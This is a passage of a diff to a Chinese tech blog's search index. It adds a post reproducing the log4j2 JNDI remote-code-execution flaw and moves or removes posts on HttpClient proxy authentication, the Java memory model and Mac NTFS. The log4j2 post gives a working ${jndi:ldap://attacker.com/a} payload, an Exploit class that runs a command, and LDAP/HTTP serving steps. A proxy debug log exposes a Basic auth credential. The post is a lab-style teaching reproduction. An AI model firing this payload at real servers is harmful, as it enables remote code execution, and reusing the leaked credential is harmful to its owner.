gzip,deflate[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="comment">// 返回报文</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;HTTP/1.1 407 Proxy Authentication Required[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Mime-Version: 1.0[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Date: Wed, 31 Jul 2019 02:19:45 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Content-Type: text/html;charset=utf-8[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Content-Length: 80[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Proxy-Authenticate: Basic realm=&quot;</span>dobel<span class="string">&#x27;s  server&quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Connection: keep-alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;407 Authentication Failed!Maybe Proxy-uthentication header is missing or wrong![\n]&quot;</span></span><br><span class="line"><span class="string">// 第二次请求报文</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.headers - http-outgoing-0 &gt;&gt; Proxy-Authorization: Basic TVRIVU9DSEU2RUVHOFFMUTEwOnhtS1FHbmJF</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;GET Http://www.baidu.com/ HTTP/1.1[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Host: www.baidu.com[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Proxy-Connection: Keep-Alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;User-Agent: Apache-HttpClient/4.5.6 (Java/1.8.0_45)[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Accept-Encoding: gzip,deflate[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Proxy-Authorization: Basic TVRIVU9DSEU2RUVHOFFMUTEwOnhtS1FHbmJF[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">// 第二次返回报文</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;HTTP/1.1 200 OK[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Content-Encoding: gzip[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Content-Type: text/html[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Date: Wed, 31 Jul 2019 02:19:46 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Last-Modified: Mon, 23 Jan 2017 13:27:36 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Pragma: no-cache[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Transfer-Encoding: chunked[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Connection: keep-alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;[\r][\n]&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="抢占式认证"><a href="#抢占式认证" class="headerlink" title="抢占式认证"></a>抢占式认证</h2><p>HttpClient 为了安全考虑，默认是不会发送认证信息的，只有在服务端要求情况下，才回去携带。可以通过直接设置 header 来实现抢先式认证。</p>
-<h2 id="请求方-407-原因"><a href="#请求方-407-原因" class="headerlink" title="请求方 407 原因"></a>请求方 407 原因</h2><p>请求方 HttpClient 在 407 时候会再次请求服务端，这两次请求对上层是透明的。按理说请求方是不知道有 407 的错误的。但是如果在超时时间内未完成这两次请求，HttpClient 就会抛出 407。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.baeldung.com/httpclient-4-basic-authentication">https://www.baeldung.com/httpclient-4-basic-authentication</a></p>
-]]></content>
-      <categories>
-        <category>异常排查</category>
-      </categories>
-      <tags>
-        <tag>Http</tag>
-        <tag>HttpClient</tag>
       </tags>
   </entry>
   <entry>
@@ -787,61 +787,6 @@
         <tag>java</tag>
         <tag>jvm</tag>
         <tag>lock</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>java内存模型</title>
-    <url>/java-memory-model.html</url>
-    <content><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="现代计算机物理内存模型"><a href="#现代计算机物理内存模型" class="headerlink" title="现代计算机物理内存模型"></a>现代计算机物理内存模型</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/memory_model_physical.png" alt="物理内存模型"></p>
-<p><strong>访问局部性</strong>（英语：Locality of reference）</p>
-<blockquote>
-<p>访问局部性分为两种基本形式，一种是时间局部性，另一种是空间局部性。时间局部性指的是，程序在运行时，最近刚刚被引用过的一个内存位置容易再次被引用，比如在调取一个函数的时候，前不久才调取过的本地参数容易再度被调取使用。空间局部性指的是，最近引用过的内存位置以及其周边的内存位置容易再次被使用。空间局部性比较常见于循环中，比如在一个数列中，如果第3个元素在上一个循环中使用，则本次循环中极有可能会使用第4个元素。</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="指令重排序"><a href="#指令重排序" class="headerlink" title="指令重排序"></a>指令重排序</h3><p>指令重排序是为了提高程序性能做得优化，比如多次写操作，每次都要会写内存，可以在线程的 working memory 操作完成后，一起回写内存。</p>
-<p>指令重排序包括：</p>
-<ul>
-<li>编译器优化重排序</li>
-<li>指令级并行重排序</li>
-<li>内存系统的重排序</li>
-</ul>
-<h4 id="as-if-serial"><a href="#as-if-serial" class="headerlink" title="as-if-serial"></a>as-if-serial</h4><p>无论如何重排序,程序执行的结果都应该与代码顺序执行的结果一致(Java编译器,运行时和处理器都会保证java在单线程下遵循as-if-serial语义).</p>
-<h4 id="线程的-working-memory"><a href="#线程的-working-memory" class="headerlink" title="线程的 working memory"></a>线程的 working memory</h4><p>是 cache 和寄存器的抽象，解释源于《Concurrent Programming in Java: Design Principles and Patterns, Second Edition》，而不单单是内存的某个部分</p>
-<h2 id="Java-内存模型（Java-Memory-Model）"><a href="#Java-内存模型（Java-Memory-Model）" class="headerlink" title="Java 内存模型（Java Memory Model）"></a>Java 内存模型（Java Memory Model）</h2><p>Java内存模型(Java Memory Model)描述了Java程序中各种变量(线程共享变量)的访问规则,以及在JVM中将变量存储到内存和从内存中读取出变量这样的底层细节.</p>
-<h3 id="happens-before-原则"><a href="#happens-before-原则" class="headerlink" title="happens-before 原则"></a>happens-before 原则</h3><p>规定了 java 指令操作的偏序关系。是 JMM 制定的一些偏序关系，用于保证内存的可见性。</p>
-<p>8大 happens-before 原则：</p>
-<ul>
-<li>单线程happen-before原则：在同一个线程中，书写在前面的操作happen-before后面的操作。</li>
-<li>锁的happen-before原则：同一个锁的unlock操作happen-before此锁的lock操作。</li>
-<li>volatile的happen-before原则：对一个volatile变量的写操作happen-before对此变量的任意操作(当然也包括写操作了)。</li>
-<li>happen-before的传递性原则：如果A操作 happen-before B操作，B操作happen-before C操作，那么A操作happen-before C操作。</li>
-<li>线程启动的happen-before原则：同一个线程的start方法happen-before此线程的其它方法。</li>
-<li>线程中断的happen-before原则：对线程interrupt方法的调用happen-before被中断线程的检测到中断发送的代码。</li>
-<li>线程终结的happen-before原则：线程中的所有操作都happen-before线程的终止检测。</li>
-<li>对象创建的happen-before原则：一个对象的初始化完成先于他的finalize方法调用。</li>
-</ul>
-<h3 id="内存可见性"><a href="#内存可见性" class="headerlink" title="内存可见性"></a>内存可见性</h3><h4 id="共享变量实现可见性原理"><a href="#共享变量实现可见性原理" class="headerlink" title="共享变量实现可见性原理"></a>共享变量实现可见性原理</h4><p>线程1对共享变量的修改对线程2可见，需要2个步骤：</p>
-<ul>
-<li>将工作内存1中修改的共享变量刷新到主内存</li>
-<li>将主内存最新的共享变量更新到工作内存2</li>
-</ul>
-<h4 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h4><p>JMM 关于synchronized 的两条规定：</p>
-<ul>
-<li>线程解锁前，刷新共享变量到主存</li>
-<li>线程加锁前，获取主存中共享变量最新值到工作内存</li>
-</ul>
-<h4 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h4><p>有内存栅栏（或内存屏障）和防止指令重排序</p>
-<p>JMM 中，在 volatile 变量写操作后加入 store 栅栏（(强制将变量值刷新到主内存中去)），在读操作前加入 load 栅栏（强制从主内存中读取变量的值）</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/1508eedba54d">https://www.jianshu.com/p/1508eedba54d</a><br><a href="https://www.jianshu.com/p/47f999a7c280">https://www.jianshu.com/p/47f999a7c280</a><br><a href="http://ifeve.com/easy-happens-before/">http://ifeve.com/easy-happens-before/</a></p>
-]]></content>
-      <categories>
-        <category>java进阶</category>
-      </categories>
-      <tags>
-        <tag>java</tag>
-        <tag>jvm</tag>
-        <tag>jmm</tag>
       </tags>
   </entry>
   <entry>
@@ -1028,6 +973,61 @@
       </tags>
   </entry>
   <entry>
+    <title>java内存模型</title>
+    <url>/java-memory-model.html</url>
+    <content><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="现代计算机物理内存模型"><a href="#现代计算机物理内存模型" class="headerlink" title="现代计算机物理内存模型"></a>现代计算机物理内存模型</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/memory_model_physical.png" alt="物理内存模型"></p>
+<p><strong>访问局部性</strong>（英语：Locality of reference）</p>
+<blockquote>
+<p>访问局部性分为两种基本形式，一种是时间局部性，另一种是空间局部性。时间局部性指的是，程序在运行时，最近刚刚被引用过的一个内存位置容易再次被引用，比如在调取一个函数的时候，前不久才调取过的本地参数容易再度被调取使用。空间局部性指的是，最近引用过的内存位置以及其周边的内存位置容易再次被使用。空间局部性比较常见于循环中，比如在一个数列中，如果第3个元素在上一个循环中使用，则本次循环中极有可能会使用第4个元素。</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="指令重排序"><a href="#指令重排序" class="headerlink" title="指令重排序"></a>指令重排序</h3><p>指令重排序是为了提高程序性能做得优化，比如多次写操作，每次都要会写内存，可以在线程的 working memory 操作完成后，一起回写内存。</p>
+<p>指令重排序包括：</p>
+<ul>
+<li>编译器优化重排序</li>
+<li>指令级并行重排序</li>
+<li>内存系统的重排序</li>
+</ul>
+<h4 id="as-if-serial"><a href="#as-if-serial" class="headerlink" title="as-if-serial"></a>as-if-serial</h4><p>无论如何重排序,程序执行的结果都应该与代码顺序执行的结果一致(Java编译器,运行时和处理器都会保证java在单线程下遵循as-if-serial语义).</p>
+<h4 id="线程的-working-memory"><a href="#线程的-working-memory" class="headerlink" title="线程的 working memory"></a>线程的 working memory</h4><p>是 cache 和寄存器的抽象，解释源于《Concurrent Programming in Java: Design Principles and Patterns, Second Edition》，而不单单是内存的某个部分</p>
+<h2 id="Java-内存模型（Java-Memory-Model）"><a href="#Java-内存模型（Java-Memory-Model）" class="headerlink" title="Java 内存模型（Java Memory Model）"></a>Java 内存模型（Java Memory Model）</h2><p>Java内存模型(Java Memory Model)描述了Java程序中各种变量(线程共享变量)的访问规则,以及在JVM中将变量存储到内存和从内存中读取出变量这样的底层细节.</p>
+<h3 id="happens-before-原则"><a href="#happens-before-原则" class="headerlink" title="happens-before 原则"></a>happens-before 原则</h3><p>规定了 java 指令操作的偏序关系。是 JMM 制定的一些偏序关系，用于保证内存的可见性。</p>
+<p>8大 happens-before 原则：</p>
+<ul>
+<li>单线程happen-before原则：在同一个线程中，书写在前面的操作happen-before后面的操作。</li>
+<li>锁的happen-before原则：同一个锁的unlock操作happen-before此锁的lock操作。</li>
+<li>volatile的happen-before原则：对一个volatile变量的写操作happen-before对此变量的任意操作(当然也包括写操作了)。</li>
+<li>happen-before的传递性原则：如果A操作 happen-before B操作，B操作happen-before C操作，那么A操作happen-before C操作。</li>
+<li>线程启动的happen-before原则：同一个线程的start方法happen-before此线程的其它方法。</li>
+<li>线程中断的happen-before原则：对线程interrupt方法的调用happen-before被中断线程的检测到中断发送的代码。</li>
+<li>线程终结的happen-before原则：线程中的所有操作都happen-before线程的终止检测。</li>
+<li>对象创建的happen-before原则：一个对象的初始化完成先于他的finalize方法调用。</li>
+</ul>
+<h3 id="内存可见性"><a href="#内存可见性" class="headerlink" title="内存可见性"></a>内存可见性</h3><h4 id="共享变量实现可见性原理"><a href="#共享变量实现可见性原理" class="headerlink" title="共享变量实现可见性原理"></a>共享变量实现可见性原理</h4><p>线程1对共享变量的修改对线程2可见，需要2个步骤：</p>
+<ul>
+<li>将工作内存1中修改的共享变量刷新到主内存</li>
+<li>将主内存最新的共享变量更新到工作内存2</li>
+</ul>
+<h4 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h4><p>JMM 关于synchronized 的两条规定：</p>
+<ul>
+<li>线程解锁前，刷新共享变量到主存</li>
+<li>线程加锁前，获取主存中共享变量最新值到工作内存</li>
+</ul>
+<h4 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h4><p>有内存栅栏（或内存屏障）和防止指令重排序</p>
+<p>JMM 中，在 volatile 变量写操作后加入 store 栅栏（(强制将变量值刷新到主内存中去)），在读操作前加入 load 栅栏（强制从主内存中读取变量的值）</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/1508eedba54d">https://www.jianshu.com/p/1508eedba54d</a><br><a href="https://www.jianshu.com/p/47f999a7c280">https://www.jianshu.com/p/47f999a7c280</a><br><a href="http://ifeve.com/easy-happens-before/">http://ifeve.com/easy-happens-before/</a></p>
+]]></content>
+      <categories>
+        <category>java进阶</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>jvm</tag>
+        <tag>jmm</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>kafka实现原理</title>
     <url>/kafka-overview.html</url>
     <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>主要讲解 Consumer 相关知识</p>
@@ -1108,36 +1108,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Mac 实现 NTFS 格式硬盘读写</title>
-    <url>/mac-NTFS.html</url>
-    <content><![CDATA[<h2 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h2><p>Mac本身是支持NTFS写入的，只是NTFS是微软开发，由于版权和一些技术细节原因，苹果不愿公开说自己支持NTFS写入，也是有自己以后可能不支持NTFS写入的考量</p>
-<span id="more"></span>
-
-<h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><ol>
-<li>挂载上你的NTFS硬盘，查看硬盘名称</li>
-<li>编辑/etc/fstab文件，使其支持NTFS写入</li>
-<li>将/Volumes中的NTFS磁盘快捷方式到Finder</li>
-</ol>
-<h2 id="详细流程"><a href="#详细流程" class="headerlink" title="详细流程"></a>详细流程</h2><ol>
-<li>插上硬盘后，查看你的硬盘名称，这里假设名称是AngleDisk</li>
-<li>打开Applications的Terminal, 你也可以直接spotlight输入terminal打开</li>
-<li>在终端输入sudo nano /etc/fstab 敲击回车</li>
-<li>现在你看到了一个编辑界面，输入LABEL=AngleDisk none ntfs rw,auto,nobrowse后，敲击回车，再Ctrl+X，再敲击Y，再敲击回车</li>
-<li>此时，退出你的移动硬盘，再重新插入，你会发现磁盘没有显示在桌面或是Finder之前出现的地方，别慌</li>
-<li>打开Finder，Command+Shift+G，输入框中输入/Volumes，回车，你就可以看到你的磁盘啦！是可以读写的哟，Enjoy</li>
-<li>方便起见，你可以直接把磁盘拖到Finder侧边栏中，这样下次使用就不用进入到/Volumes目录打开le</li>
-</ol>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.zhihu.com/question/19571334">https://www.zhihu.com/question/19571334</a></p>
-]]></content>
-      <categories>
-        <category>101</category>
-      </categories>
-      <tags>
-        <tag>mac</tag>
-        <tag>ntfs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>nginx实现原理</title>
     <url>/nginx-implement.html</url>
     <content><![CDATA[<h2 id="简单理解-Nginx"><a href="#简单理解-Nginx" class="headerlink" title="简单理解 Nginx"></a>简单理解 Nginx</h2><p>nginx 是静态 web 服务器，意思是 engine x。并发量高，性能优越</p>
@@ -1194,42 +1164,65 @@
       </tags>
   </entry>
   <entry>
-    <title>protobuf 安装使用</title>
-    <url>/protobuf-use.html</url>
-    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
-<li><p>官网下载 <a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a></p>
-</li>
-<li><p>解压，cd 到目录下</p>
-</li>
-<li><p>./configure</p>
-</li>
-<li><p>make</p>
-</li>
-<li><p>make check</p>
-</li>
-<li><p>sudo make install</p>
-</li>
-<li><p>which protoc</p>
-</li>
-<li><p>protoc –version</p>
-<span id="more"></span></li>
-</ul>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="编写proto文件（idl文件）"><a href="#编写proto文件（idl文件）" class="headerlink" title="编写proto文件（idl文件）"></a>编写proto文件（idl文件）</h3><p>一个名为 Person.proto文件如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax=&quot;proto3&quot;; </span><br><span class="line">option java_package = &quot;org.serialization.protobuf.quickstart&quot;;   </span><br><span class="line">option java_outer_classname = &quot;PersonProtobuf&quot;;   </span><br><span class="line">message Person  &#123;   </span><br><span class="line">  int32 age = 1;</span><br><span class="line">  string name = 2;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+    <title>log4j2 远程执行漏洞原理与复现</title>
+    <url>/log4j2-rce.html</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>使用了 log4j2，2.0~ 2.14.1 版本的均有影响</p>
+<p><a href="https://news.ycombinator.com/item?id=29499867">像Steam，Apple iCloud</a>这样的云服务以及像Minecraft这样的应用程序已经被发现容易受到攻击。</p>
+<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>引用了 log4j2 漏洞版本的服务器</p>
+<p>黑客服务器（ladp + http）</p>
+<p>从该请求中注入字符串的日志语句</p>
+<h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><ol>
+<li>发送包含恶意字符串的请求（通过任何协议）</li>
+<li>服务器记录请求中数据。包含恶意有效负载：（其中是攻击者控制的服务器），<code>$&#123;jndi:ldap://attacker.com/a&#125;</code></li>
+<li>该漏洞由此有效负载触发，服务器通过<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">“Java 命名和目录接口</a>“（JNDI）发出请求，<code>log4j</code> <code>attacker.com/a</code></li>
+<li>此响应包含注入服务器进程的远程 Java 类文件（例如 ）的路径，<code>http://second-stage.attacker.com/Exploit.class</code></li>
+<li>此注入的有效负载会触发第二阶段，并允许攻击者执行任意代码。</li>
+</ol>
+<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>具体的代码见 github：<a href="https://github.com/zhouxinghang/log4j2-rce">zhouxinghang/log4j2-rce: log4j2 remote code execution sample (github.com)</a></p>
+<h4 id="编写攻击类"><a href="#编写攻击类" class="headerlink" title="编写攻击类"></a>编写攻击类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 要执行的命令</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>使用 protoc 编译器，将 proto 文件编译成 java 文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protoc --java_out=./ Person.proto</span><br></pre></td></tr></table></figure>
+<p>会在 mac 系统上启动计算器</p>
+<h4 id="开启-http-服务"><a href="#开启-http-服务" class="headerlink" title="开启 http 服务"></a>开启 http 服务</h4><p>将攻击类 Exploit.java 编译成 Exploit.class 文件。并在 class 目录下启动 Http 服务，用于远程下载攻击类。<code>python3 -m http.server 8100</code></p>
+<h4 id="开启-LDAP-服务"><a href="#开启-LDAP-服务" class="headerlink" title="开启 LDAP 服务"></a>开启 LDAP 服务</h4><p>启动 <code>LDAPRefServer</code> 类，监听 ladp 请求，响应远程 Java 类文件的路径，<a href="http://127.0.0.1:8100/Exploit.class%E3%80%82%E8%A2%AB%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E4%BC%9A%E6%89%A7%E8%A1%8C%E8%AF%A5%E8%BF%9C%E7%A8%8B%E7%B1%BB">http://127.0.0.1:8100/Exploit.class。被攻击服务会执行该远程类</a></p>
+<h4 id="被攻击服务"><a href="#被攻击服务" class="headerlink" title="被攻击服务"></a>被攻击服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerableLog4jExampleHandler</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * A simple HTTP endpoint that reads the request&#x27;s User Agent and logs it back.</span></span><br><span class="line"><span class="comment">   * This is basically pseudo-code to explain the vulnerability, and not a full example.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> he HTTP Request Object</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange he)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userAgent = he.getRequestHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span></span><br><span class="line">    <span class="comment">// The attacker can set their User-Agent header to: $&#123;jndi:ldap://attacker.com/a&#125;</span></span><br><span class="line">    log.info(<span class="string">&quot;Request User Agent:&#123;&#125;&quot;</span>, userAgent);</span><br><span class="line"></span><br><span class="line">    String response = <span class="string">&quot;&lt;h1&gt;Hello There, &quot;</span> + userAgent + <span class="string">&quot;!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    he.sendResponseHeaders(<span class="number">200</span>, response.length());</span><br><span class="line">    OutputStream os = he.getResponseBody();</span><br><span class="line">    os.write(response.getBytes());</span><br><span class="line">    os.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="序列化调用"><a href="#序列化调用" class="headerlink" title="序列化调用"></a>序列化调用</h3><p>引入 maven 依赖</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.protobuf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>protobuf-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在请求被攻击服务时候，设置 <code>user-agent = $&#123;jndi:ldap://127.0.0.1:1389/a&#125;</code>。log4j2 打印 user-agent 值就会执行远程类。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://twitter.com/chvancooten/status/1469340927923826691">Cas van Cooten 在 Twitter： “A story in three part 😶 #log4j https://t.co/XMl02BcaJY” / Twitter</a></p>
+<p><a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">marshalsec/LDAPRefServer.java at master · mbechler/marshalsec (github.com)</a></p>
+]]></content>
+      <tags>
+        <tag>log4j</tag>
+        <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mac 实现 NTFS 格式硬盘读写</title>
+    <url>/mac-NTFS.html</url>
+    <content><![CDATA[<h2 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h2><p>Mac本身是支持NTFS写入的，只是NTFS是微软开发，由于版权和一些技术细节原因，苹果不愿公开说自己支持NTFS写入，也是有自己以后可能不支持NTFS写入的考量</p>
+<span id="more"></span>
 
+<h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><ol>
+<li>挂载上你的NTFS硬盘，查看硬盘名称</li>
+<li>编辑/etc/fstab文件，使其支持NTFS写入</li>
+<li>将/Volumes中的NTFS磁盘快捷方式到Finder</li>
+</ol>
+<h2 id="详细流程"><a href="#详细流程" class="headerlink" title="详细流程"></a>详细流程</h2><ol>
+<li>插上硬盘后，查看你的硬盘名称，这里假设名称是AngleDisk</li>
+<li>打开Applications的Terminal, 你也可以直接spotlight输入terminal打开</li>
+<li>在终端输入sudo nano /etc/fstab 敲击回车</li>
